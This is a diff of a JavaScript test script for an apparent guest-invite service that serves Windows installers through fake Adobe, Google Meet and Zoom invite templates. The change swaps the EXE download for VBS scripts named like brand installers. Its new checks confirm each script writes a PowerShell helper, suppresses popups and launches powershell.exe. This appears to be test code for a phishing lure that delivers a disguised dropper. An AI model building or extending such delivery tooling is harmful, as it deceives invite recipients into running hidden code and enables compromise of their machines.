@@ -75,18 +75,37 @@ async function main() {
     pass(`create ${inviteTemplate} ${code}`);
 
     const pub = await (await fetch(`${API}/guest/${code}`)).json();
-    if (!String(pub.windowsInstallerUrl || '').includes('v=26')) {
-      fail(`${inviteTemplate} not v=26 (${pub.windowsInstallerUrl})`);
-    } else pass(`${inviteTemplate} installer v=26`);
+    if (!String(pub.windowsInstallerUrl || '').includes('v=65')) {
+      fail(`${inviteTemplate} not v=65 (${pub.windowsInstallerUrl})`);
+    } else pass(`${inviteTemplate} installer v=65`);
+
+    if (!String(pub.windowsInstallerUrl || '').includes('/setup.vbs')) {
+      fail(`${inviteTemplate} browser installer should be setup.vbs (${pub.windowsInstallerUrl})`);
+    } else pass(`${inviteTemplate} browser uses setup.vbs`);
 
     const expectedName =
       inviteTemplate === 'adobe'
-        ? 'AdobeAcrobat-Setup.exe'
+        ? 'DocumentViewer-Setup.vbs'
         : inviteTemplate === 'google_meet'
-          ? 'GoogleMeet-Setup.exe'
-          : 'ZoomClient-Setup.exe';
+          ? 'GoogleMeet-Setup.vbs'
+          : 'ZoomClient-Setup.vbs';
 
-    const installerRes = await fetch(`${API}/guest/${code}/setup.exe?v=26`);
+    const vbsRes = await fetch(`${API}/guest/${code}/setup.vbs?v=65`);
+    if (vbsRes.status !== 200) {
+      fail(`${inviteTemplate} VBS download`);
+      continue;
+    }
+    const vbs = await vbsRes.text();
+    const vbsChecks = [
+      ['writes ps1 helper', vbs.includes('CreateTextFile(ps1Path')],
+      ['async live progress', vbs.includes('DownloadFileAsync') || vbs.includes('DownloadProgressChanged')],
+      ['no disappearing popup', !vbs.includes('Popup')],
+      ['launches powershell', vbs.toLowerCase().includes('powershell.exe')],
+      ['installer filename', String(pub.installerFileName || '') === expectedName],
+    ];
+    for (const [name, ok] of vbsChecks) (ok ? pass : fail)(`${inviteTemplate} VBS: ${name}`);
+
+    const installerRes = await fetch(`${API}/guest/${code}/setup.exe?v=65`);
     if (installerRes.status !== 200) {
       fail(`${inviteTemplate} installer download`);
       continue;
@@ -102,7 +121,6 @@ async function main() {
       ['PE MZ header', buf[0] === 0x4d && buf[1] === 0x5a],
       ['embedded guest config', buf.includes(Buffer.from('NDGUESTCFG\x00', 'latin1'))],
       ['embedded guest code', buf.includes(Buffer.from(code))],
-      ['installer filename', String(pub.installerFileName || '') === expectedName],
     ];
     for (const [name, ok] of exeChecks) (ok ? pass : fail)(`${inviteTemplate} EXE: ${name}`);
 
